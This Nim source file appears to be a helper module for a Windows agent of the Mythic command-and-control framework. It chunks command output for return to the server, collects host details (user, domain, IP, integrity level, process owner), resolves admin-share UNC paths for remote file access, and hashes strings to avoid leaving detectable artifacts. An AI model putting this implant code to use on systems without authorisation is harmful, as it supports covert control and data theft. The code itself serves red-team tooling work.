import  std/options
from os import getCurrentProcessId, getEnv, extractFilename, getCurrentDir
import std/net
import winim/lean
import strutils
import json
import structs
import config



template DBG*(msg: string) =
  when defined(debug):
    echo msg


# Separate Windows API Function Definitions
proc IsWow64Process2(hProcess: HANDLE, pProcessMachine: PUSHORT, pNativeMachine: PUSHORT): WINBOOL {.winapi, stdcall, dynlib: "kernel32", importc.}



#[
  A little helper function that can be used for each cmd_* implementation
  to return the result without having to prepare the full struct

  -> this will chunk the data according to the `connection.transferBytesUp`
  Field aka toolong command outputs will get transfered via multiple packets
  to avoid congestion on NamedPipes / HTTP
]#
proc buildReturnData*(taskId: string,  userOutput: string, status="", special=SpecialCase.Default): seq[TaskResponse] =

  let CHUNK_SIZE = connection.transferBytesUp
  let lenUO = len(userOutput)
  let numOfChunks = int(lenUO / CHUNK_SIZE) + 1


  # Create the UserOutput object and fill it
  var taskOut = UserOutput(
          task_id: taskId,
          completed: false,
          status: status
          )

  for i in 1..numOfChunks:

    # the start and end index of the
    # useroutput buffer
    let startIdx = (i-1) * CHUNK_SIZE
    var endIdx = startIdx + CHUNK_SIZE

    # truncate if the last chunk is smaller
    if endIdx >= lenUO:
      endIdx = lenUO

    # get the chunk of the userdata and set it to the
    # struct
    let chunkedUserOutput = useroutput[startIdx..<endIdx]

    if special == SpecialCase.default:
      taskout.user_output = chunkedUserOutput
    elif special == SpecialCase.FileBrowser:
      taskout.file_browser = some(chunkedUserOutput)

    # if its the last chunk, set completed to true
    if i == numOfChunks:
      taskOut.completed = true

    # add to the returning seq
    let tr = TaskResponse(
      action: "post_response",
      responses: @[%*taskOut]   # converted to a JSON node
    )
    result.add(tr)

  #[
  else:

    # Create the UserOutput object and fill it
    var taskOut = UserOutput(
            task_id: taskId,
            completed: true,
            status: status
            )

    # handle special cases, such as file explorer or processlist
    if special == SpecialCase.default:
      taskout.user_output = useroutput
    elif special == SpecialCase.FileBrowser:
      taskout.file_browser = some(useroutput)

    result = @[
      TaskResponse(
        action: "post_response",
        responses: @[%*taskOut]   # converted to a JSON node
      )
    ]
]#

#[
  the wrapper to send/retrieve messages from mythic
  -> the main code is stored in profiles/xxx.nim with the
  same function prototype
]#
#proc sendAndRetrData*(con: ConnectionInformation,  data: string): Option[JsonNode]  =
#  return profile.sendAndRetrData(con, data)



# Returns the current PID
proc getPID*(): int =
  return getCurrentProcessId()

# Returns the local IP
proc getLocalIP*(): string =
  return $getPrimaryIPAddr()

# Returns the current User
proc getUser*(): string =
  return getEnv("USERNAME")


# Return the current Domain
proc getDomain*(): string =
  return getEnv("USERDOMAIN")


proc getHost*(): string =
  return getEnv("COMPUTERNAME")


# Return the Process Integrity
# Level of the currently running process
proc getIntegrityLevel*(hProcess: HANDLE): int =

  var
    status: BOOL
    procToken: HANDLE
    tokenInfoLen: DWORD
    tokenInfo: PTOKEN_MANDATORY_LABEL
    hProc: HANDLE

  # if its 0, take the own process,
  # otherwise take the supplied one
  if hProcess == 0:
    hProc = GetCurrentProcess()
  else:
    hProc = hProcess

  # open the process with TOKEN_QUERY
  status = OpenProcessToken(hProc, TOKEN_QUERY, addr procToken)


  # Get the Length and then the actual output value
  status = GetTokenInformation(procToken, tokenIntegrityLevel, addr tokenInfo, 0, addr tokenInfoLen)

  if status == FALSE and cast[int](GetLastError()) != 122:
    DBG("[-] GetTokenInformation() failed: " & $GetLastError())
    return 1

  # Allocate Memory for the struct
  tokenInfo = cast[PTOKEN_MANDATORY_LABEL](alloc(tokenInfoLen))
  status = GetTokenInformation(procToken, tokenIntegrityLevel, tokenInfo, tokenInfoLen, addr tokenInfoLen)

  if status == FALSE:
    DBG("[-] GetTokenInformation() failed: " & $GetLastError())
    return 1

  var integrityLevel = GetSidSubAuthority(
    tokenInfo.Label.Sid,
    cast[DWORD](GetSidSubAuthorityCount(tokenInfo.Label.Sid)[]) - 1
  )

  if integrityLevel[] < SECURITY_MANDATORY_LOW_RID:
    return 0 # UNTRUSTED
  if integrityLevel[] < SECURITY_MANDATORY_MEDIUM_RID:
    return 1 # LOW
  if integrityLevel[] >= SECURITY_MANDATORY_MEDIUM_RID and integrityLevel[] < SECURITY_MANDATORY_HIGH_RID:
    return 2 # MEDIUM
  if integrityLevel[] >= SECURITY_MANDATORY_HIGH_RID and integrity_level[] < SECURITY_MANDATORY_SYSTEM_RID:
    return 3 # HIGH
  if integrityLevel[] >= SECURITY_MANDATORY_SYSTEM_RID:
    return 4 # HIGH

  # default, return UNTRUSTED
  return 0


# Get current process name
proc getProcessName*(): string =
  var fullProcname: LPSTR = cast[LPSTR](alloc(256))
  var pathLen: DWORD = 256

  QueryFullProcessImageNameA(GetCurrentProcess(), PROCESS_NAME_NATIVE, fullProcname, addr pathLen)
  return extractFilename($cast[cstring](fullProcname))


#[
  Uses the weird isWOW64Process2 function
  to obtain the info if a process is 64 or 32
  bit
]#
proc getArchitecture*(hProc: HANDLE): string =

  var isWOW64: USHORT
  if IsWow64Process2(hProc, addr isWOW64, NULL) == FALSE:
    return ""

  if isWOW64 == IMAGE_FILE_MACHINE_UNKNOWN:
    return "x64"
  elif isWOW64 == IMAGE_FILE_MACHINE_I386:
    return "x86"
  else:
    return "x86"

# reads string from memory
# into nim string
proc toString*(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))



#[
  Gets the owner of another process by
  parsing the Sid Entries of that process
]#
proc getProcessOwner*(hProc: HANDLE): string =

  var
    hTok: HANDLE
    status: BOOL
    pTokenUser: PTOKEN_USER
    bufLen: DWORD
    userName: LPSTR = cast[LPSTR](alloc(256))
    domain: LPSTR = cast[LPSTR](alloc(256))
    sidType: SID_NAME_USE

  status = OpenProcessToken(hProc, TOKEN_QUERY, addr hTok)

  # if it fails, return an empty string
  if status == FALSE:
    DBG("[-] OpenProcessToken() failed: " & $GetLastError())
    return ""

  if hTok == 0:
    return ""

  status = GetTokenInformation(hTok, tokenUser, pTokenUser, 0, addr bufLen)

  if status == FALSE and cast[int](GetLastError()) != 122:
    DBG("[-] GetTokenInformation() failed: " & $GetLastError())
    return ""



  pTokenUser = cast[PTOKEN_USER](alloc(bufLen))
  status = GetTokenInformation(hTok, tokenUser, pTokenUser, bufLen, addr bufLen)
  if status == FALSE:
    DBG("[-] GetTokenInformation() failed: " & $GetLastError())
    return ""

  DBG("[+] GetTokenInformation() success")


  var userNameLen: DWORD = 256
  var domainLen: DWORD = 256

  status = LookupAccountSidA(NULL, pTokenUser.User.Sid, userName, addr userNameLen, domain, addr domainLen, addr sidType)

  if status == FALSE:
    DBG("[-] LookupAccountSidA() failed: " & $GetLastError())
    return ""

  # return the final user in the form of `DOMAIN\USER`
  return $(cast[cstring](domain)) & "\\" & $(cast[cstring](userName))


#[
  Takes a path and host component and outputs
  the full path, deciding wheather to use a local
  or a UNC path
  -> Useful for all fs commands: ls, cp, mv, ...
]#
proc resolveCorrectPath*(path: string, host: string): string =

  var host = host.toLowerAscii()
  var path = path

  if path == ".":
    path = getCurrentDir()

  # If no host is specified,
  # the path is the path, nomatter what
  if host == "":
    return path

  # if path is already a UNC path and host is non-empty
  # return the path
  if path.startsWith("\\\\") and host != "":
    return path

  # if the host in the host-field is not the
  # localhost, it needs to resolve to a UNC path
  if host != "" and
      host != getHost().toLowerAscii() and
      host.toLowerAscii() != "localhost" and
      host.toLowerAscii() != "127.0.0.1":
    result = "\\\\" & host & "\\"
    if path.startsWith("\\\\"):
      result = result & path[2..<len(path)]
    else:
      result = result & path
    # if we are using a UNC path, C:\path will be C$\path
    result = result.replace(":", "$")
  else:
    # This is the branch if we are dealing with a local
    # path -> strip leading `\\` and replace "$" with ":"
    if path.startswith("\\\\"):
      result = path[2..<len(path)]
    else:
      result = path
    result = result.replace("$", ":")



#[
function for hashing strings
to leave out all the string artifacts
]#
proc djb2*(inp: string): uint64 =
  result = 5381

  for c in inp:
    result =  (result shl int64(5)) + result + cast[uint64](c)



